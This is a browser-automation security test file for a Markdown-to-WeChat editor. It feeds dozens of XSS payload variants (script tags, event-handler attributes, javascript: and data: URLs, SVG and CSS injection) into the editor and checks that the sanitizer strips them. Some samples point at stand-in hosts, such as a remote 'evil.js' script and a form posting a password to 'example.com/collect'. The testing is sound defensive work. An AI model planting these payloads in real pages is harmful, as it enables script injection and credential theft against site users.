// tests/security.mjs — 安全专项测试（阶段 4，方案 §4.6 / §4.2 / §6）
//
// 运行方法（在仓库根目录）：
//   node tests/security.mjs
// 或：
//   cd tests && npm test        （已纳入 npm test 串联）
//
// 浏览器：playwright-core + 本机已缓存的 chromium_headless_shell
// （~/.cache/ms-playwright/，与 smoke.mjs 同款写法）。
// 不要跑 `npx playwright install chromium`。
//
// 覆盖（攻击样例以 tests/fixtures/dangerous.md 为主，另加本文件内联的
// 变体样例；每个样例在预览 DOM、复制输出 getWechatHTML()、HTML 导出
// 三条链路上都断言干净）：
//   §1 script（含大小写/多行/外链/嵌套/畸形）
//   §2 事件属性（onerror/onclick/onmouseover/onfocus/ontoggle/autofocus
//      等，含主动触发事件后仍无执行）
//   §3 危险 URL（javascript:/data:text/html/vbscript:/实体编码/前导空格
//      /大小写混淆，含脚注链路）
//   §4 SVG（onload/animate/foreignObject/xlink:href）
//   §5 iframe/srcdoc/object/embed/form/base/link/meta
//   §6 style 标签与 CSS 注入（expression()/url(javascript:)/CSS 转义，
//      含合法内联样式保留对照）
//   §7 嵌套/畸形/注释混淆
//   §8 模板表达式注入（按纯文本渲染）
//   §9 合法对照组（正常链接、图片、代码、表格、details 不受损）
//   §10 脚注 URL 与 HTML 导出标题的安全处理
//   §11 CSP 与离线验证（connect-src 'none'、断网可用、零网络请求）
//   §12 Clipboard 三路降级（API 可用 / API 不可用 / execCommand 失败）
//
// 执行探针：addInitScript 把 window.alert 改写为记录函数（window.__alerts），
// 任何攻击载荷执行都会留下记录；另监听 pageerror。headless file:// 下
// 真实系统剪贴板不可靠，§12 的剪贴板实际写入用打桩捕获验证，真实写入
// 与微信后台粘贴留给 stage4/WECHAT_MANUAL_TEST.md 的用户实测。
// 每个断言独立计数并打印 PASS/FAIL；任一失败退出码为 1。

import { chromium } from 'playwright-core';
import { readFileSync, existsSync, readdirSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const REPO = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const INDEX_URL = 'file://' + path.join(REPO, 'index.html');
const DANGEROUS = path.join(REPO, 'tests', 'fixtures', 'dangerous.md');

function findChromiumExe() {
  if (process.env.PLAYWRIGHT_CHROMIUM_EXE) return process.env.PLAYWRIGHT_CHROMIUM_EXE;
  const base = path.join(process.env.HOME || '/home/hatch', '.cache', 'ms-playwright');
  if (!existsSync(base)) return null;
  for (const dir of readdirSync(base).filter((d) => d.startsWith('chromium_headless_shell-'))) {
    const exe = path.join(base, dir, 'chrome-headless-shell-linux64', 'chrome-headless-shell');
    if (existsSync(exe)) return exe;
  }
  return null;
}

let pass = 0, fail = 0;
const failures = [];
function check(name, cond, extra = '') {
  if (cond) { pass++; console.log('PASS ' + name); }
  else { fail++; failures.push(name); console.log('FAIL ' + name + (extra ? ' — ' + extra : '')); }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const exe = findChromiumExe();
if (!exe) {
  console.log('FAIL 未找到缓存的 chromium_headless_shell（~/.cache/ms-playwright/），无法运行 security 测试');
  process.exit(1);
}

const browser = await chromium.launch({ executablePath: exe, args: ['--no-sandbox'] });
const pageErrors = [];
let page;
try {
  const context = await browser.newContext({ viewport: { width: 1280, height: 800 } });
  // 执行探针：alert 改写为记录；confirm 默认同意（复制本地图片提示不干扰测试）
  await context.addInitScript(() => {
    window.__alerts = [];
    window.alert = (m) => { window.__alerts.push(String(m)); };
    window.confirm = () => true;
  });
  page = await context.newPage();
  page.on('pageerror', (err) => pageErrors.push(String(err && err.message || err)));
  const requests = [];
  page.on('request', (req) => requests.push(req.url()));
  await page.goto(INDEX_URL);
  await page.waitForSelector('#preview', { timeout: 15000 });
  await page.evaluate(() => localStorage.clear());
  await page.reload();
  await page.waitForSelector('#preview', { timeout: 15000 });
  await sleep(500);
  // 初始加载阶段的请求快照：此后各节会设置含外链图片的测试文稿，浏览器
  // 按 img-src 加载用户内容图片是预期行为，不计入本快照；断言只针对
  // 应用自身加载阶段（默认示例文档无图片，只应有 file:// 本地资源）。
  const loadRequests = requests.slice();

  const setMd = (md) => page.evaluate((t) => {
    const editor = document.querySelector('#editor');
    editor.value = t;
    editor.dispatchEvent(new Event('input', { bubbles: true }));
  }, md);
  const alerts = () => page.evaluate(() => window.__alerts.slice());
  const clearAlerts = () => page.evaluate(() => { window.__alerts = []; });

  // 预览 DOM 审计：危险节点/属性/URL/样式 + 执行探针
  const previewAudit = () => page.evaluate(() => {
    const p = document.querySelector('#preview');
    const q = (s) => p.querySelectorAll(s).length;
    const onAttrs = Array.from(p.querySelectorAll('*')).flatMap((el) =>
      Array.from(el.attributes).map((a) => a.name).filter((n) => n.toLowerCase().startsWith('on')));
    const hrefs = Array.from(p.querySelectorAll('a[href]')).map((a) => a.getAttribute('href') || '');
    const srcs = Array.from(p.querySelectorAll('[src]')).map((el) => el.getAttribute('src') || '');
    const styleAttrHits = Array.from(p.querySelectorAll('[style]'))
      .map((el) => el.getAttribute('style') || '')
      .filter((s) => /expression\s*\(|javascript\s*:|vbscript\s*:|data\s*:\s*text\/html/i.test(s));
    return {
      script: q('script'), iframe: q('iframe'), object: q('object'), embed: q('embed'),
      form: q('form'), link: q('link'), meta: q('meta'), base: q('base'), style: q('style'),
      svg: q('svg'), math: q('math'), foreignObject: q('foreignObject'), animate: q('animate'),
      onAttrs: [...new Set(onAttrs)],
      badHref: hrefs.filter((h) => /(javascript|data:text\/html|vbscript)\s*:/i.test(h)),
      badSrc: srcs.filter((s) => /javascript\s*:/i.test(s)),
      styleAttrHits,
      bodyBg: getComputedStyle(document.body).backgroundColor,
      alerts: window.__alerts.slice(),
    };
  });
  // 输出字符串审计（复制 HTML / 导出 HTML 共用）
  const cleanString = (s) => ({
    hasScript: /<script/i.test(s),
    hasIframe: /<iframe/i.test(s),
    hasStyle: /<style/i.test(s),
    hasObject: /<(object|embed|form)\b/i.test(s),
    hasOnAttr: / on\w+\s*=/i.test(s),
    hasJsHref: /href\s*=\s*["']\s*javascript:/i.test(s),
    hasExpr: /expression\s*\(/i.test(s),
    hasJsCssUrl: /url\(\s*javascript:/i.test(s),
    hasJsScheme: /javascript\s*:/i.test(s),
  });
  const wxClean = async () => cleanString(await page.evaluate(() => window.getWechatHTML().html));
  const exportBlob = async () => page.evaluate(async () => {
    window.__exportedBlob = null;
    const origCreate = URL.createObjectURL.bind(URL);
    URL.createObjectURL = (blob) => { window.__exportedBlob = blob; return origCreate(blob); };
    const origClick = HTMLAnchorElement.prototype.click;
    HTMLAnchorElement.prototype.click = function () {}; // 只取 blob 内容，不真的触发下载
    try { window.exportHTML(); } finally { HTMLAnchorElement.prototype.click = origClick; }
    return window.__exportedBlob ? await window.__exportedBlob.text() : null;
  });
  const exportClean = async () => cleanString(await exportBlob());
  const assertOutputClean = async (label) => {
    const wx = await wxClean();
    const ex = await exportClean();
    const ok = (c) => !c.hasScript && !c.hasIframe && !c.hasStyle && !c.hasObject
      && !c.hasOnAttr && !c.hasJsHref && !c.hasExpr && !c.hasJsCssUrl;
    check(`${label}：复制输出干净（无 script/iframe/style/object/事件属性/javascript:）`, ok(wx), JSON.stringify(wx));
    check(`${label}：HTML 导出干净（无 script/iframe/style/object/事件属性/javascript:）`, ok(ex), JSON.stringify(ex));
  };

  // ================= §1 script =================
  await clearAlerts();
  await setMd([
    '<script>alert("S1-a")</script>',
    '<ScRiPt>alert("S1-b")</ScRiPt>',
    '<script src="https://example.com/evil.js"></script>',
    '<script>\n// 多行\nwindow.__alerts.push("S1-c");\n</script>',
    '<script >alert("S1-d")</script >',
    '<script\nalert("S1-e")</script>',
    '正常文本段落。',
  ].join('\n\n'));
  await sleep(700);
  let a = await previewAudit();
  check('§1 script：预览无 script 节点', a.script === 0, `script=${a.script}`);
  check('§1 script：无执行（alert 探针 0 次）', a.alerts.length === 0, JSON.stringify(a.alerts));
  await assertOutputClean('§1 script');

  // ================= §2 事件属性 =================
  await clearAlerts();
  await setMd([
    '<img src="x" onerror="alert(\'S2-img-onerror\')">',
    '<img src="https://example.com/ok.png" onerror="alert(\'S2-b\')" onload="alert(\'S2-c\')">',
    '<div onclick="alert(\'S2-d\')">点我</div>',
    '<div onmouseover="alert(\'S2-e\')" onfocus="alert(\'S2-f\')" tabindex="0">悬停</div>',
    '<a href="https://example.com" onclick="alert(\'S2-h\')">链接</a>',
    '<details open ontoggle="alert(\'S2-i\')"><summary>折叠</summary>内容</details>',
    '<input onfocus="alert(\'S2-j\')" autofocus>',
    '<video><source onerror="alert(\'S2-k\')"></video>',
    '<svg onload="alert(\'S2-svg\')"><circle r="10"/></svg>',
    '<body onload="alert(\'S2-body\')">',
  ].join('\n\n'));
  await sleep(900); // 给 onerror/onload 自然触发留时间
  a = await previewAudit();
  check('§2 事件属性：预览无任何 on* 属性', a.onAttrs.length === 0, JSON.stringify(a.onAttrs));
  check('§2 事件属性：图片加载失败也未触发 onerror', a.alerts.length === 0, JSON.stringify(a.alerts));
  // 主动触发：点击/悬停/聚焦预览内所有元素，残留处理器会立即暴露
  await page.evaluate(() => {
    const p = document.querySelector('#preview');
    p.querySelectorAll('*').forEach((el) => {
      ['click', 'mouseover', 'focus', 'mousedown'].forEach((t) => {
        try { el.dispatchEvent(new Event(t, { bubbles: true })); } catch (_) {}
      });
    });
  });
  await sleep(300);
  check('§2 事件属性：主动触发 click/mouseover/focus 后仍无执行',
    (await alerts()).length === 0, JSON.stringify(await alerts()));
  await assertOutputClean('§2 事件属性');

  // ================= §3 危险 URL =================
  await clearAlerts();
  await setMd([
    '<a href="javascript:alert(\'S3-a\')">js1</a>',
    '<a href="JaVaScRiPt:alert(\'S3-b\')">js2</a>',
    '<a href="   javascript:alert(\'S3-c\')">js3 前导空格</a>',
    '<a href="java&#115;cript:alert(\'S3-d\')">js4 实体编码</a>',
    '<a href="&#106;avascript:alert(\'S3-e\')">js5 实体编码首字母</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data 链接</a>',
    '<a href="vbscript:msgbox(\'S3-f\')">vbscript 链接</a>',
    '<img src="javascript:alert(\'S3-g\')">',
    '<a href="java\tscript:alert(\'S3-h\')">js 制表符</a>',
    '<a href="https://example.com/ok">合法外链对照</a>',
  ].join('\n\n'));
  await sleep(700);
  a = await previewAudit();
  check('§3 危险 URL：预览无 javascript:/data:text/html/vbscript: 链接与 src',
    a.badHref.length === 0 && a.badSrc.length === 0,
    JSON.stringify({ badHref: a.badHref, badSrc: a.badSrc }));
  check('§3 危险 URL：无执行（alert 探针 0 次）', a.alerts.length === 0, JSON.stringify(a.alerts));
  // 脚注链路：危险 href 不得进入文末附录；合法外链正常编号
  const wx3 = await page.evaluate(() => window.getWechatHTML().html);
  check('§3 危险 URL（脚注）：复制输出不含任何 javascript: 字符串',
    !/javascript\s*:/i.test(wx3), wx3.slice(0, 200));
  check('§3 危险 URL（脚注）：合法外链仍正常转为脚注 [1]',
    wx3.includes('[1]') && wx3.includes('https://example.com/ok'));
  await assertOutputClean('§3 危险 URL');

  // ================= §4 SVG =================
  await clearAlerts();
  await setMd([
    '<svg onload="alert(\'S4-a\')"><circle r="10"/></svg>',
    '<svg><script>alert("S4-b")</script></svg>',
    '<svg><a xlink:href="javascript:alert(\'S4-c\')"><text>点击</text></a></svg>',
    '<svg><animate onbegin="alert(\'S4-d\')" attributeName="x" dur="1s"/></svg>',
    '<svg><foreignObject><div onclick="alert(\'S4-e\')">fo</div></foreignObject></svg>',
    '<math><mi//xlink:href="data:x,<script>alert(\'S4-f\')</script>">',
    '<svg><style><img src="x" onerror="alert(\'S4-g\')"></style></svg>',
    '<svg><a href="javascript:alert(\'S4-h\')"><text>js</text></a></svg>',
  ].join('\n\n'));
  await sleep(900);
  a = await previewAudit();
  check('§4 SVG：svg/math/foreignObject/animate 全部清除',
    a.svg === 0 && a.math === 0 && a.foreignObject === 0 && a.animate === 0,
    JSON.stringify({ svg: a.svg, math: a.math, fo: a.foreignObject, animate: a.animate }));
  check('§4 SVG：无 script/style 残留，无 on* 属性',
    a.script === 0 && a.style === 0 && a.onAttrs.length === 0,
    JSON.stringify({ script: a.script, style: a.style, onAttrs: a.onAttrs }));
  check('§4 SVG：无执行（alert 探针 0 次）', a.alerts.length === 0, JSON.stringify(a.alerts));
  await assertOutputClean('§4 SVG');

  // ================= §5 iframe/srcdoc/object/embed/form/base/link/meta =================
  await clearAlerts();
  await setMd([
    '<iframe src="https://example.com"></iframe>',
    '<iframe srcdoc="<script>alert(\'S5-a\')</script>"></iframe>',
    '<iframe src="javascript:alert(\'S5-b\')"></iframe>',
    '<object data="https://example.com/x.swf"></object>',
    '<embed src="https://example.com/x.swf">',
    '<object><param name="x" value="y"></object>',
    '<form action="https://example.com/collect"><input type="text" name="password" value="secret"></form>',
    '<form><button formaction="javascript:alert(\'S5-c\')">提交</button></form>',
    '<base href="https://example.com/evil/">',
    '<link rel="stylesheet" href="https://example.com/evil.css">',
    '<meta http-equiv="refresh" content="0;url=https://example.com">',
    '<meta charset="utf-8">',
  ].join('\n\n'));
  await sleep(700);
  a = await previewAudit();
  check('§5 嵌入/表单类：iframe/object/embed/form/link/meta/base 全部清除',
    a.iframe === 0 && a.object === 0 && a.embed === 0 && a.form === 0
    && a.link === 0 && a.meta === 0 && a.base === 0,
    JSON.stringify({ iframe: a.iframe, object: a.object, embed: a.embed, form: a.form, link: a.link, meta: a.meta, base: a.base }));
  check('§5 嵌入/表单类：<base> 未改变页面 baseURI（仍为 file://）',
    await page.evaluate(() => document.baseURI.startsWith('file://')), await page.evaluate(() => document.baseURI));
  check('§5 嵌入/表单类：无执行（alert 探针 0 次）', a.alerts.length === 0, JSON.stringify(a.alerts));
  await assertOutputClean('§5 嵌入/表单类');

  // ================= §6 style 与 CSS 注入 =================
  await clearAlerts();
  await setMd([
    '<style>body{background:red}</style>',
    '<style><img src="x" onerror="alert(\'S6-a\')"></style>',
    '<div style="background-image:url(javascript:alert(\'S6-b\'))">CSS url 注入</div>',
    '<div style="width:expression(alert(\'S6-c\'))">IE expression</div>',
    '<a href="https://example.com" style="x:expression(alert(\'S6-d\'))">CSS expression 2</a>',
    '<div style="color:red;width:expr\\65 ssion(alert(\'S6-e\'))">CSS 转义 expression</div>',
    '<div style="background:url(vbscript:msgbox(1));color:blue">vbscript url</div>',
    '<div style="color:red;-moz-binding:url(https://example.com/evil.xml#x)">moz-binding</div>',
    '<span style="color:#c00;font-weight:700">合法红字加粗对照</span>',
    '<div style="background-image:url(https://example.com/a.png);color:green">合法 https 背景图对照</div>',
  ].join('\n\n'));
  await sleep(700);
  a = await previewAudit();
  check('§6 style/CSS：<style> 标签连内容一并清除，页面背景未被染红',
    a.style === 0 && a.bodyBg !== 'rgb(255, 0, 0)', JSON.stringify({ style: a.style, bodyBg: a.bodyBg }));
  check('§6 style/CSS：内联 style 危险声明全部清除（expression/javascript:/vbscript:）',
    a.styleAttrHits.length === 0, JSON.stringify(a.styleAttrHits));
  check('§6 style/CSS：无执行（alert 探针 0 次）', a.alerts.length === 0, JSON.stringify(a.alerts));
  const legitStyle = await page.evaluate(() => {
    const p = document.querySelector('#preview');
    const span = Array.from(p.querySelectorAll('span')).find((el) => el.textContent.includes('合法红字加粗对照'));
    const div = Array.from(p.querySelectorAll('div')).find((el) => el.textContent.includes('合法 https 背景图对照'));
    return {
      spanStyle: span ? span.getAttribute('style') || '' : null,
      divStyle: div ? div.getAttribute('style') || '' : null,
    };
  });
  check('§6 style/CSS：合法内联样式保留（color/font-weight）',
    legitStyle.spanStyle !== null && /color\s*:\s*(#c00|rgb\(204,\s*0,\s*0\))/i.test(legitStyle.spanStyle)
    && /font-weight\s*:\s*700/.test(legitStyle.spanStyle), JSON.stringify(legitStyle));
  check('§6 style/CSS：合法 https 背景图 url 保留',
    legitStyle.divStyle !== null && /url\(https:\/\/example\.com\/a\.png\)/.test(legitStyle.divStyle)
    && /color\s*:\s*green/.test(legitStyle.divStyle), JSON.stringify(legitStyle));
  await assertOutputClean('§6 style/CSS');

  // ================= §7 嵌套/畸形/注释混淆 =================
  await clearAlerts();
  await setMd([
    '<<script>alert("S7-a");//<</script>',
    '<script><script>alert("S7-b")</script>',
    '<!-- <script>alert("S7-c")</script> -->',
    '<img src="x:x" onerror="alert(\'S7-d\')">',
    '<img src="x" `onerror="alert(\'S7-e\')">',
    '<scr<script>ipt>alert("S7-f")</scr</script>ipt>',
    '<div><script>alert("S7-g")</script></div>',
    '<svg><script>alert("S7-h")</script></svg>',
    '<!--[if IE]><script>alert("S7-i")</script><![endif]-->',
  ].join('\n\n'));
  await sleep(700);
  a = await previewAudit();
  check('§7 嵌套/畸形：预览无 script/svg/on* 残留',
    a.script === 0 && a.svg === 0 && a.onAttrs.length === 0,
    JSON.stringify({ script: a.script, svg: a.svg, onAttrs: a.onAttrs }));
  check('§7 嵌套/畸形：无执行（alert 探针 0 次）', a.alerts.length === 0, JSON.stringify(a.alerts));
  await assertOutputClean('§7 嵌套/畸形');

  // ================= §8 模板表达式注入 =================
  await clearAlerts();
  await setMd([
    '${alert("S8-a")}',
    '{{alert("S8-b")}}',
    '<% alert("S8-c") %>',
    '#{alert("S8-d")}',
    '正常文本 ${user.name} 与 {{title}}。',
  ].join('\n\n'));
  await sleep(700);
  a = await previewAudit();
  check('§8 模板表达式：无 script/on*，无执行',
    a.script === 0 && a.onAttrs.length === 0 && a.alerts.length === 0, JSON.stringify(a.alerts));
  check('§8 模板表达式：按纯文本渲染（模板原文可见）',
    await page.evaluate(() => {
      const t = document.querySelector('#preview').innerText;
      return t.includes('S8-a') && t.includes('S8-b') && t.includes('S8-c') && t.includes('S8-d');
    }));
  await assertOutputClean('§8 模板表达式');

  // ================= §9 合法对照组 =================
  await clearAlerts();
  await setMd([
    '# 合法对照标题',
    '',
    '[普通外链](https://example.com) 与 [公众号](https://mp.weixin.qq.com/s/test)。',
    '',
    '![外链图片](https://picsum.photos/seed/safe/200/100)',
    '',
    '```js',
    'const s = "<script>alert(1)</script>"; // 代码块内的 script 文本',
    '```',
    '',
    '| 表头 A | 表头 B |',
    '| --- | --- |',
    '| 单元格 | 单元格 |',
    '',
    '<details><summary>合法 details</summary>内容</details>',
    '',
    '<b>粗体</b> <i>斜体</i> <u>下划线</u> <mark>高亮</mark> <code>行内代码</code>',
    '',
    '<div align="center">align 属性对照</div>',
  ].join('\n'));
  await sleep(800);
  const legal = await page.evaluate(() => {
    const p = document.querySelector('#preview');
    const hrefs = Array.from(p.querySelectorAll('a[href]')).map((a) => a.getAttribute('href') || '');
    const codeText = Array.from(p.querySelectorAll('pre code')).map((c) => c.textContent).join('\n');
    return {
      h1: p.querySelectorAll('h1').length,
      hasExample: hrefs.includes('https://example.com'),
      hasMp: hrefs.includes('https://mp.weixin.qq.com/s/test'),
      img: p.querySelectorAll('img[src="https://picsum.photos/seed/safe/200/100"]').length,
      table: p.querySelectorAll('table').length,
      details: p.querySelectorAll('details').length,
      alignDiv: p.querySelectorAll('div[align="center"]').length,
      codeHasScriptText: codeText.includes('<script>alert(1)</script>'),
      scriptNodes: p.querySelectorAll('script').length,
      alerts: window.__alerts.slice(),
    };
  });
  check('§9 合法对照：链接/图片/表格/details/align 全部保留',
    legal.h1 === 1 && legal.hasExample && legal.hasMp && legal.img === 1
    && legal.table === 1 && legal.details === 1 && legal.alignDiv === 1, JSON.stringify(legal));
  check('§9 合法对照：代码块内的 <script> 文本只作代码显示，不成节点、不执行',
    legal.codeHasScriptText && legal.scriptNodes === 0 && legal.alerts.length === 0,
    JSON.stringify(legal));
  const wx9 = await page.evaluate(() => window.getWechatHTML());
  check('§9 合法对照：复制输出保留链接与表格',
    wx9.html.includes('https://mp.weixin.qq.com/s/test') && wx9.html.includes('<table'),
    wx9.html.slice(0, 160));

  // ================= §10 脚注 URL 与导出标题 =================
  // 10a. 脚注附录只含纯文本 p，无 <a>（危险 URL 即便混入也成不了可点击链接）
  await setMd('[外链](https://example.com/page1) 与 [公众号](https://mp.weixin.qq.com/s/abc) 与 [外链二](https://github.com/x)。');
  await sleep(600);
  const foot = await page.evaluate(() => {
    const w = window.getWechatHTML().html;
    const secIdx = w.lastIndexOf('<section style="margin-top:28px;');
    const appendix = secIdx >= 0 ? w.slice(secIdx) : '';
    return {
      appendix,
      hasAnchorInAppendix: /<a\b/i.test(appendix),
      hasPage1: appendix.includes('https://example.com/page1'),
      hasGithub: appendix.includes('https://github.com/x'),
      hasMpInBody: /<a[^>]*href="https:\/\/mp\.weixin\.qq\.com\/s\/abc"/.test(w),
    };
  });
  check('§10 脚注：附录为纯文本 p，无 <a> 标签',
    foot.hasPage1 && foot.hasGithub && !foot.hasAnchorInAppendix, foot.appendix.slice(0, 240));
  check('§10 脚注：公众号链接保留在正文 <a> 中，不进附录',
    foot.hasMpInBody && !foot.appendix.includes('mp.weixin.qq.com'));

  // 10b. 导出标题：文件名含 <script> 也只作转义文本
  await page.evaluate(() => {
    document.querySelector('#fileName').textContent = '<script>alert("TITLE")</script>恶意标题';
  });
  const exportedTitle = await exportBlob();
  check('§10 导出标题：标题中 <script> 已转义为 &lt;script&gt;',
    typeof exportedTitle === 'string' && exportedTitle.includes('&lt;script&gt;')
    && !/<title>[^<]*<script/i.test(exportedTitle), String(exportedTitle && exportedTitle.slice(0, 300)));
  check('§10 导出标题：导出文档全文无原生 <script 字符串',
    typeof exportedTitle === 'string' && !/<script/i.test(exportedTitle),
    String(exportedTitle && exportedTitle.slice(0, 200)));
  await page.evaluate(() => { document.querySelector('#fileName').textContent = 'article'; });
  await clearAlerts();

  // ================= §11 CSP 与离线验证 =================
  const csp = await page.evaluate(() => {
    const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    return m ? m.getAttribute('content') : null;
  });
  check('§11 CSP：connect-src 仍为 \'none\'（未放宽）',
    typeof csp === 'string' && /connect-src\s+'none'/.test(csp), String(csp));
  check('§11 CSP：无 unsafe-eval、无远程 script-src',
    typeof csp === 'string' && !/unsafe-eval/.test(csp) && !/script-src[^;]*https?:/.test(csp), String(csp));
  check('§11 CSP：object-src/base-uri/form-action 仍为 \'none\'',
    typeof csp === 'string' && /object-src\s+'none'/.test(csp) && /base-uri\s+'none'/.test(csp)
    && /form-action\s+'none'/.test(csp), String(csp));
  // 断网加载：初始加载阶段的全部请求只应有 file:// 本地资源
  const nonFileReqs = loadRequests.filter((u) => !u.startsWith('file://'));
  check('§11 离线：页面加载至今零网络请求（仅 file:// 本地资源）',
    nonFileReqs.length === 0, JSON.stringify(nonFileReqs.slice(0, 5)) + `（加载阶段共 ${loadRequests.length} 个请求）`);
  // 浏览器离线模式：重载、编辑、主题切换、导出均可用
  await context.setOffline(true);
  try {
    await page.reload({ waitUntil: 'load', timeout: 15000 });
    await page.waitForSelector('#preview', { timeout: 15000 });
    await sleep(500);
    check('§11 离线：断网后 file:// 重载成功',
      await page.evaluate(() => !!document.querySelector('#preview')));
    const OFF_MARK = 'OFFLINE-TEST-' + Date.now();
    await setMd('# 离线标题\n\n' + OFF_MARK + '\n');
    await sleep(600);
    check('§11 离线：断网后编辑与渲染可用',
      await page.evaluate((m) => document.querySelector('#preview').innerText.includes(m), OFF_MARK));
    await page.selectOption('#themeSel', 'classic');
    await sleep(400);
    check('§11 离线：断网后主题切换可用',
      await page.evaluate(() => document.querySelector('#themeSel').value === 'classic'));
    await page.selectOption('#themeSel', 'tech');
    await sleep(400);
    const offExport = await exportBlob();
    check('§11 离线：断网后 HTML 导出可用且含最新内容',
      typeof offExport === 'string' && offExport.includes(OFF_MARK), String(offExport && offExport.slice(0, 120)));
  } finally {
    await context.setOffline(false);
  }

  // ================= §12 Clipboard 三路降级 =================
  // 注：headless file:// 下真实系统剪贴板不可靠，三路均用打桩捕获应用
  // 交出的数据；真实写入与微信后台粘贴见 WECHAT_MANUAL_TEST.md。
  const CLIP_MARK = 'CLIPBOARD-TEST-' + Date.now();
  await setMd('# 剪贴板测试\n\n' + CLIP_MARK + '\n');
  await sleep(600);

  // 12A. Clipboard API 可用：成功提示只在真实写操作完成后出现
  await page.reload();
  await page.waitForSelector('#preview', { timeout: 15000 });
  await sleep(500);
  await setMd('# 剪贴板测试\n\n' + CLIP_MARK + '\n');
  await sleep(600);
  const clipA = await page.evaluate(async (marker) => {
    window.__copiedHtml = null;
    window.__writeResolved = false;
    let resolveWrite;
    const gate = new Promise((r) => { resolveWrite = r; });
    try {
      Object.defineProperty(navigator, 'clipboard', {
        value: {
          write: async (items) => {
            await gate; // 人为挂起：写操作完成前 toast 不应出现
            const blob = await items[0].getType('text/html');
            window.__copiedHtml = await blob.text();
            window.__writeResolved = true;
          },
          writeText: async () => {},
        },
        configurable: true,
      });
      window.ClipboardItem = class {
        constructor(map) { this._map = map; }
        async getType(t) { return this._map[t]; }
      };
    } catch (_) { return { stub: 'STUB-FAILED' }; }
    window.__resolveWrite = resolveWrite;
    const clickP = window.copyWechat();
    await new Promise((r) => setTimeout(r, 250));
    const toastBefore = document.querySelector('#toast').textContent;
    window.__resolveWrite();
    await clickP;
    await new Promise((r) => setTimeout(r, 100));
    const toastAfter = document.querySelector('#toast').textContent;
    return { toastBefore, toastAfter, html: window.__copiedHtml, marker };
  }, CLIP_MARK);
  check('§12A 剪贴板 API：写操作完成前不出现成功提示',
    !clipA.toastBefore.includes('已复制'), JSON.stringify(clipA.toastBefore));
  check('§12A 剪贴板 API：写操作完成后才出现成功提示，且交出内容含最新文稿',
    clipA.toastAfter.includes('已复制') && typeof clipA.html === 'string' && clipA.html.includes(CLIP_MARK),
    JSON.stringify({ toastAfter: clipA.toastAfter, len: clipA.html && clipA.html.length }));

  // 12B. Clipboard API 不可用：execCommand 兼容复制成功
  await page.reload();
  await page.waitForSelector('#preview', { timeout: 15000 });
  await sleep(500);
  await setMd('# 剪贴板测试\n\n' + CLIP_MARK + '\n');
  await sleep(600);
  const clipB = await page.evaluate(async (marker) => {
    window.__execCalls = [];
    try {
      Object.defineProperty(navigator, 'clipboard', { value: undefined, configurable: true });
      window.ClipboardItem = undefined;
      document.execCommand = (...args) => { window.__execCalls.push(args[0]); return true; };
    } catch (_) { return { stub: 'STUB-FAILED' }; }
    await window.copyWechat();
    await new Promise((r) => setTimeout(r, 100));
    return {
      toast: document.querySelector('#toast').textContent,
      execCalls: window.__execCalls,
      fallbackHidden: document.querySelector('#fallbackModal').hidden,
      marker,
    };
  }, CLIP_MARK);
  check('§12B 无 Clipboard API：execCommand 兼容复制成功，提示“已复制（兼容模式）”',
    clipB.toast.includes('已复制（兼容模式）') && clipB.execCalls.includes('copy'),
    JSON.stringify(clipB));
  check('§12B 无 Clipboard API：兼容复制成功时不弹备用弹窗',
    clipB.fallbackHidden === true, JSON.stringify(clipB));

  // 12C. execCommand 失败：备用弹窗出现，富文本全选与 HTML 源码复制可用
  await page.reload();
  await page.waitForSelector('#preview', { timeout: 15000 });
  await sleep(500);
  await setMd('# 剪贴板测试\n\n' + CLIP_MARK + '\n\n<script>alert("S12")</script>\n\n<img src="x" onerror="alert(\'S12\')">');
  await sleep(600);
  const clipC = await page.evaluate(async (marker) => {
    window.__sourceCopied = null;
    try {
      Object.defineProperty(navigator, 'clipboard', {
        value: { writeText: async (t) => { window.__sourceCopied = t; }, write: async () => { throw new Error('no api'); } },
        configurable: true,
      });
      window.ClipboardItem = undefined;
      document.execCommand = (...args) => { if (args[0] === 'copy') return false; return true; };
    } catch (_) { return { stub: 'STUB-FAILED' }; }
    await window.copyWechat();
    await new Promise((r) => setTimeout(r, 200));
    const modalHidden = document.querySelector('#fallbackModal').hidden;
    const rich = document.querySelector('#fallbackRich');
    const richAudit = {
      script: rich.querySelectorAll('script').length,
      style: rich.querySelectorAll('style').length,
      onAttrs: Array.from(rich.querySelectorAll('*')).flatMap((el) =>
        Array.from(el.attributes).map((a) => a.name).filter((n) => n.toLowerCase().startsWith('on'))).length,
      hasMarker: rich.innerText.includes(marker),
    };
    // 富文本全选
    document.querySelector('#btnSelectRich').click();
    await new Promise((r) => setTimeout(r, 100));
    const toastSelect = document.querySelector('#toast').textContent;
    const selText = getSelection().toString();
    // HTML 源码复制
    document.querySelector('#btnCopySource').click();
    await new Promise((r) => setTimeout(r, 200));
    const toastSource = document.querySelector('#toast').textContent;
    return {
      modalHidden, richAudit, toastSelect,
      selHasMarker: selText.includes(marker),
      toastSource, sourceCopied: window.__sourceCopied,
      marker,
    };
  }, CLIP_MARK);
  check('§12C execCommand 失败：显示备用弹窗', clipC.modalHidden === false, JSON.stringify(clipC.modalHidden));
  check('§12C execCommand 失败：备用弹窗富文本区同样干净且含最新文稿',
    clipC.richAudit.script === 0 && clipC.richAudit.style === 0 && clipC.richAudit.onAttrs === 0
    && clipC.richAudit.hasMarker, JSON.stringify(clipC.richAudit));
  check('§12C execCommand 失败：富文本全选可用（选中内容含最新文稿）',
    clipC.toastSelect.includes('已全选') && clipC.selHasMarker,
    JSON.stringify({ toast: clipC.toastSelect, sel: clipC.selHasMarker }));
  check('§12C execCommand 失败：HTML 源码复制可用（写出内容含最新文稿）',
    clipC.toastSource.includes('HTML 源码已复制') && typeof clipC.sourceCopied === 'string'
    && clipC.sourceCopied.includes(CLIP_MARK), JSON.stringify({ toast: clipC.toastSource, len: clipC.sourceCopied && clipC.sourceCopied.length }));
  check('§12C execCommand 失败：全程无攻击执行（alert 探针 0 次）',
    (await alerts()).length === 0, JSON.stringify(await alerts()));

  // ================= 收尾：无未捕获异常 =================
  check('全程无未捕获 JS 异常', pageErrors.length === 0, JSON.stringify(pageErrors.slice(0, 3)));
} catch (err) {
  fail++;
  failures.push('security 流程异常：' + (err && err.message));
  console.log('FAIL security 流程异常：' + (err && err.message));
} finally {
  await browser.close();
}

